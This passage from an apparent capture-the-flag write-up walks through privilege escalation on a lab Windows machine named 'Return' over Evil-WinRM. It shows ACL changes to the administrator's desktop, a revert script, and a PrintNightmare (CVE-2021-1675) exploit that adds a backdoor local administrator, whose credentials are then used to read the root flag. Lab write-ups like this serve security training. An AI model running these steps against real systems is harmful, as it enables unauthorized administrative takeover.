-</span></span><span class="line"><span class="cl">Access : RETURN<span class="se">\s</span>vc-printer Allow  FullControl
-</span></span><span class="line"><span class="cl">         NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
-</span></span><span class="line"><span class="cl">         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
-</span></span><span class="line"><span class="cl">         RETURN<span class="se">\A</span>dministrator Allow  FullControl
-</span></span><span class="line"><span class="cl">Audit  :
-</span></span><span class="line"><span class="cl">Sddl   : O:BAG:DUD:AI<span class="o">(</span>A<span class="p">;</span>OICI<span class="p">;</span>FA<span class="p">;;;</span>S-1-5-21-3750359090-2939318659-876128439-1103<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
-</span></span></code></pre></div><p>Now I can read the flag</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nb">type</span> <span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
-</span></span><span class="line"><span class="cl">9f8dd...<span class="o">[</span>SNIP<span class="o">]</span>...
-</span></span></code></pre></div><p>I also made the <a href="https://github.com/fahmifj/AAD-scripts/blob/main/Acl-RevokeFullControl.ps1">anti script</a> to revert what I did on the admin&rsquo;s desktop folder.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Acl-RevokeFullControl -User <span class="k">return</span><span class="se">\s</span>vc-printer -Path C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Current permissions:
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
-</span></span><span class="line"><span class="cl">Owner  : BUILTIN<span class="se">\A</span>dministrators
-</span></span><span class="line"><span class="cl">Group  : RETURN<span class="se">\D</span>omain Users
-</span></span><span class="line"><span class="cl">Access : RETURN<span class="se">\s</span>vc-printer Allow  FullControl
-</span></span><span class="line"><span class="cl">         NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
-</span></span><span class="line"><span class="cl">         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
-</span></span><span class="line"><span class="cl">         RETURN<span class="se">\A</span>dministrator Allow  FullControl
-</span></span><span class="line"><span class="cl">Audit  :
-</span></span><span class="line"><span class="cl">Sddl   : O:BAG:DUD:AI<span class="o">(</span>A<span class="p">;</span>OICI<span class="p">;</span>FA<span class="p">;;;</span>S-1-5-21-3750359090-2939318659-876128439-1103<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User permissions to remove on C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">FileSystemRights  : FullControl
-</span></span><span class="line"><span class="cl">AccessControlType : Allow
-</span></span><span class="line"><span class="cl">IdentityReference : RETURN<span class="se">\s</span>vc-printer
-</span></span><span class="line"><span class="cl">IsInherited       : False
-</span></span><span class="line"><span class="cl">InheritanceFlags  : ContainerInherit, ObjectInherit
-</span></span><span class="line"><span class="cl">PropagationFlags  : None
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Acls changed successfully.
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
-</span></span><span class="line"><span class="cl">Owner  : BUILTIN<span class="se">\A</span>dministrators
-</span></span><span class="line"><span class="cl">Group  : RETURN<span class="se">\D</span>omain Users
-</span></span><span class="line"><span class="cl">Access : NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
-</span></span><span class="line"><span class="cl">         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
-</span></span><span class="line"><span class="cl">         RETURN<span class="se">\A</span>dministrator Allow  FullControl
-</span></span><span class="line"><span class="cl">Audit  :
-</span></span><span class="line"><span class="cl">Sddl   : O:BAG:DUD:AI<span class="o">(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; gc <span class="se">\\</span>printer<span class="se">\c</span>$<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
-</span></span><span class="line"><span class="cl">Access to the path <span class="s1">&#39;\\printer\c$\users\administrator\desktop\root.txt&#39;</span> is denied.
-</span></span><span class="line"><span class="cl">At line:1 char:1
-</span></span><span class="line"><span class="cl">+ gc <span class="se">\\</span>printer<span class="se">\c</span>$<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
-</span></span><span class="line"><span class="cl">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-</span></span><span class="line"><span class="cl">    + CategoryInfo          : PermissionDenied: <span class="o">(</span><span class="se">\\</span>printer<span class="se">\c</span>$<span class="se">\u</span>s...esktop<span class="se">\r</span>oot.txt:String<span class="o">)</span> <span class="o">[</span>Get-Content<span class="o">]</span>, UnauthorizedAccessException
-</span></span><span class="line"><span class="cl">    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
-</span></span></code></pre></div><h4 id="alternative--printnightmare-lpe">(Alternative)  PrintNightmare LPE</h4>
-<p>And here&rsquo;s the ultimate exploit.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
-</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Invoke-Nightmare -NewUser <span class="s2">&#34;choropys&#34;</span> -NewPassword <span class="s2">&#34;ch0ropys!&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> created payload at C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\n</span>ightmare.dll
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> using <span class="nv">pDriverPath</span> <span class="o">=</span> <span class="s2">&#34;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\mxdwdrv.dll&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> added user choropys as <span class="nb">local</span> administrator
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> deleting payload from C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\n</span>ightmare.dll
-</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; net user
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">User accounts <span class="k">for</span> <span class="se">\\</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------
-</span></span><span class="line"><span class="cl">Administrator            choropys                 Guest
-</span></span><span class="line"><span class="cl">krbtgt                   svc-printer
-</span></span><span class="line"><span class="cl">The <span class="nb">command</span> completed with one or more errors.
-</span></span></code></pre></div><p>The hard way to read the root flag (afaik this won&rsquo;t work if WinRM disabled).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nv">$username</span> <span class="o">=</span> <span class="s2">&#34;choropys&#34;</span>
-</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nv">$password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s2">&#34;ch0ropys!&#34;</span> -AsPlainText -Force
-</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nv">$cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
-</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Invoke-Command -Computer localhost -Credential <span class="nv">$cred</span> -ScriptBlock <span class="o">{</span> gci C:/users/administrator/desktop/root.txt <span class="o">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name                                                                                                 PSComputerName
-</span></span><span class="line"><span class="cl">----                -------------         ------ ----                                                                                                 --------------
-</span></span><span class="line"><span class="cl">-ar---       10/14/2021  10:33 PM             <span class="m">34</span> root.txt                                                                                             localhost
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Invoke-Command -Computer localhost -Credential <span class="nv">$cred</span> -ScriptBlock <span class="o">{</span> gc C:/users/administrator/desktop/root.txt <span class="o">}</span>
-</span></span><span class="line"><span class="cl">9f8dd...<span class="o">[</span>SNIP<span class="o">]</span>...
-</span></span></code></pre></div>]]></content:encoded>
     </item>
     
   </channel>
